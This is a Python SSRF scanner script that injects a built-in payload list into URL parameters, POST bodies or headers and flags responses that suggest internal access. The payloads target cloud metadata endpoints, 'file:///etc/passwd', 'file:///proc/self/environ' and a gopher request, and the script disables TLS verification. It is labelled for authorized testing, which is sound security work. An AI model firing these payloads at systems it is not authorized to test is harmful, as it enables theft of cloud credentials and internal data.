#!/usr/bin/env python3
"""
ssrf_scanner.py - SSRF detection scanner (defensive testing only)

Usage example:
  python ssrf_scanner.py --url "http://target.local/?url=http://example" --params url --payloads payloads.txt --threads 10 --proxy http://127.0.0.1:8080

Notes:
 - Defensive use only (authorized testing).
 - Requires `requests`.
"""

from __future__ import annotations
import argparse
import csv
import datetime
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, ParseResult

import requests

# Default payloads (same idea as your bash defaults)
DEFAULT_PAYLOADS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://localhost/",
    "http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://10.0.0.1/",
    "http://192.168.0.1/",
    "http://172.16.0.1/",
    "file:///etc/passwd",
    "file:///proc/self/environ",
    "gopher://127.0.0.1:70/_GET / HTTP/1.0%0D%0A%0D%0A",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://instance-data/latest/meta-data/",
]

# Suspicious regex patterns (compiled)
SUSPICIOUS_RE = re.compile(
    r"(169\.254\.169\.254|169254169254|instance-data|ec2\.metadata|metadata\.google|"
    r"amazonaws\.com|internal|root:|passwd|\b127(?:\.\d{1,3}){3}\b|\b10(?:\.\d{1,3}){3}\b|"
    r"\b192\.168(?:\.\d{1,3}){2}\b|\b172\.(1[6-9]|2[0-9]|3[0-1])(?:\.\d{1,3}){2}\b|"
    r"Connection refused|Connection timed out|timed out|Name or service not known)",
    flags=re.IGNORECASE,
)

# Common connection error strings to check in exception messages / responses
ERROR_STRINGS_RE = re.compile(r"(Connection refused|Connection timed out|timed out|Name or service not known)", re.IGNORECASE)

# Thread-safe CSV writer lock
csv_lock = threading.Lock()


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="SSRF detection scanner (defensive testing only)")
    p.add_argument("--url", required=True, help="Target URL (include scheme). If URL has query params and --params omitted they'll be used.")
    p.add_argument("--params", help="Comma-separated parameter names to test (e.g., url,redirect). If omitted, existing query params are used; otherwise defaults to 'url'.")
    p.add_argument("--payloads", help="File with one payload per line (comments starting with # ignored). If omitted, built-in payloads are used.")
    p.add_argument("--threads", type=int, default=10, help="Concurrency threads (default: 10)")
    p.add_argument("--proxy", help="HTTP(S) proxy e.g. http://127.0.0.1:8080")
    p.add_argument("--method", choices=("GET", "POST"), default="GET", help="HTTP method (default: GET). POST uses form data unless --json.")
    p.add_argument("--headers", help="Comma-separated header names to inject payload into (e.g., X-Forwarded-For).")
    p.add_argument("--timeout", type=float, default=8.0, help="Request timeout seconds (default: 8)")
    p.add_argument("--outfile", default="ssrf_results.csv", help="CSV output filename (default: ssrf_results.csv)")
    p.add_argument("--json", action="store_true", dest="use_json", help="If set & method=POST, send JSON body {param: payload}")
    p.add_argument("--user-agent", default="ssrf-scanner-python/1.0", help="User-Agent header")
    p.add_argument("--extra-pattern", help="Additional regex pattern to mark suspicious (case-insensitive)")
    return p.parse_args()


def load_payloads(path: Optional[str]) -> List[str]:
    if path:
        payloads = []
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                payloads.append(line)
        return payloads
    return DEFAULT_PAYLOADS.copy()


def determine_params(target_url: str, params_arg: Optional[str]) -> List[str]:
    if params_arg:
        return [p.strip() for p in params_arg.split(",") if p.strip()]
    # extract from query portion of the URL
    parsed = urlparse(target_url)
    if parsed.query:
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        keys = []
        for k, _ in qs:
            if k and k not in keys:
                keys.append(k)
        if keys:
            return keys
    # fallback default
    return ["url"]


def replace_query_param(url: str, param: str, value: str) -> str:
    """
    Replace param in url if exists, otherwise append param=value.
    Always returns a full URL string.
    """
    parsed: ParseResult = urlparse(url)
    qsl = parse_qsl(parsed.query, keep_blank_values=True)

    found = False
    new_qsl = []
    for (k, v) in qsl:
        if k == param:
            new_qsl.append((k, value))
            found = True
        else:
            new_qsl.append((k, v))
    if not found:
        new_qsl.append((param, value))

    new_query = urlencode(new_qsl, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)


def build_headers(base_headers: Dict[str, str], header_names_csv: Optional[str], payload: str) -> Dict[str, str]:
    hdrs = dict(base_headers)
    if header_names_csv:
        for h in [x.strip() for x in header_names_csv.split(",") if x.strip()]:
            hdrs[h] = payload
    return hdrs


def inspect_response_text(text: str, headers: Dict[str, str], extra_re: Optional[re.Pattern]) -> Tuple[bool, str]:
    """
    Return (is_suspicious, matched_indicators_string)
    """
    indicators = []

    # check body
    if SUSPICIOUS_RE.search(text):
        indicators.extend(list({m.group(0) for m in SUSPICIOUS_RE.finditer(text)}))

    # check headers values
    hdr_text = " ".join(f"{k}:{v}" for k, v in headers.items())
    if SUSPICIOUS_RE.search(hdr_text):
        indicators.extend(list({m.group(0) for m in SUSPICIOUS_RE.finditer(hdr_text)}))

    # extra pattern
    if extra_re:
        if extra_re.search(text) or extra_re.search(hdr_text):
            indicators.append("extra_pattern_match")

    # join unique
    indicators = list(dict.fromkeys(indicators))
    return (len(indicators) > 0, ";".join(indicators))


def row_write_csv(outfile: str, row: Dict[str, str]):
    """
    Thread-safe CSV append.
    """
    with csv_lock:
        first = False
        # check if file exists already by opening in append and seeing if it has content
        try:
            with open(outfile, "r", encoding="utf-8") as f:
                first = f.read(1) == ""
        except FileNotFoundError:
            first = True
        # append row
        fieldnames = [
            "timestamp",
            "target",
            "tested_param",
            "payload",
            "final_url",
            "status",
            "error",
            "indicators",
            "snippet",
            "redirect_chain",
        ]
        with open(outfile, "a", newline="", encoding="utf-8") as fh:
            writer = csv.DictWriter(fh, fieldnames=fieldnames, quoting=csv.QUOTE_ALL)
            # write header if new file or empty
            if fh.tell() == 0:
                writer.writeheader()
            writer.writerow(row)


def make_proxy_dict(proxy: Optional[str]) -> Optional[Dict[str, str]]:
    if not proxy:
        return None
    # requests expects a dict for 'http' and 'https'
    return {"http": proxy, "https": proxy}


def snippet_from_text(text: str, max_chars: int = 800) -> str:
    s = re.sub(r"\s+", " ", text.strip())
    return s[:max_chars]


def worker_task(
    target_url: str,
    param: str,
    payload: str,
    method: str,
    headers_csv: Optional[str],
    timeout: float,
    proxy: Optional[str],
    use_json: bool,
    user_agent: str,
    outfile: str,
    extra_re: Optional[re.Pattern],
):
    """
    One test vector: target + param + payload
    """
    proxies = make_proxy_dict(proxy)
    base_headers = {"User-Agent": user_agent}
    headers = build_headers(base_headers, headers_csv, payload)

    is_url_like = re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", payload) is not None

    # Prepare final URL for GET and also store final_url for CSV
    final_url = replace_query_param(target_url, param, payload) if method == "GET" else target_url

    status_code = ""
    error_text = ""
    indicators = ""
    snippet = ""
    redirect_chain = ""

    try:
        if method == "GET":
            resp = requests.get(final_url, headers=headers, timeout=timeout, allow_redirects=True, proxies=proxies, verify=False)
        else:
            if use_json:
                json_body = {param: payload}
                resp = requests.post(target_url, headers={**headers, "Content-Type": "application/json"}, json=json_body, timeout=timeout, allow_redirects=True, proxies=proxies, verify=False)
            else:
                # form-encoded
                data = {param: payload}
                resp = requests.post(target_url, headers=headers, data=data, timeout=timeout, allow_redirects=True, proxies=proxies, verify=False)

        status_code = str(resp.status_code)
        text = resp.text or ""
        snippet = snippet_from_text(text)
        # build redirect chain
        if resp.history:
            chain = [r.url for r in resp.history] + [resp.url]
            redirect_chain = " -> ".join(chain)
        else:
            redirect_chain = resp.url

        suspicious, indicators = inspect_response_text(text, resp.headers, extra_re)

        # also consider Location header if present (redirects to internal)
        loc = resp.headers.get("Location", "")
        if loc and (SUSPICIOUS_RE.search(loc) or (extra_re and extra_re.search(loc))):
            suspicious = True
            if indicators:
                indicators += ";location_redirect"
            else:
                indicators = "location_redirect"

        if suspicious:
            print(f"[{datetime.datetime.now().isoformat()}] SUSPICIOUS param={param} payload={payload} status={status_code} indicators={indicators}")

    except requests.exceptions.RequestException as e:
        error_text = str(e)
        # check message content for known error strings
        m = ERROR_STRINGS_RE.search(error_text)
        if m:
            indicators = m.group(0)
        print(f"[{datetime.datetime.now().isoformat()}] ERROR param={param} payload={payload} error={error_text}")

    # Write CSV row
    row = {
        "timestamp": datetime.datetime.now().isoformat(sep=" "),
        "target": target_url,
        "tested_param": param,
        "payload": payload,
        "final_url": final_url,
        "status": status_code,
        "error": error_text,
        "indicators": indicators,
        "snippet": snippet,
        "redirect_chain": redirect_chain,
    }
    row_write_csv(outfile, row)


def main():
    args = parse_args()

    payloads = load_payloads(args.payloads)
    params = determine_params(args.url, args.params)
    extra_re = re.compile(args.extra_pattern, re.IGNORECASE) if args.extra_pattern else None

    print(f"[+] Target: {args.url}")
    print(f"[+] Params to test: {params}")
    print(f"[+] Payloads: {len(payloads)}")
    print(f"[+] Method: {args.method} {'(JSON POST)' if args.use_json else ''}")
    if args.proxy:
        print(f"[+] Proxy: {args.proxy}")

    # Build job list
    jobs = []
    for p in params:
        for pl in payloads:
            jobs.append((args.url, p, pl))

    # Run with ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=args.threads) as exe:
        futures = []
        for (target, param, payload) in jobs:
            futures.append(
                exe.submit(
                    worker_task,
                    target,
                    param,
                    payload,
                    args.method,
                    args.headers,
                    args.timeout,
                    args.proxy,
                    args.use_json,
                    args.user_agent,
                    args.outfile,
                    extra_re,
                )
            )

        # iterate to propagate exceptions if any
        try:
            for f in as_completed(futures):
                # exceptions in worker_task will propagate here
                _ = f.result()
        except KeyboardInterrupt:
            print("[!] Interrupted by user, shutting down.")
            exe.shutdown(wait=False)
            sys.exit(1)
        except Exception as exc:
            print(f"[!] Unexpected error: {exc}")
            # continue to finish remaining jobs

    print(f"[+] Completed. Results saved to {args.outfile}")


if __name__ == "__main__":
    # ignore insecure request warnings when verify=False used
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    main()
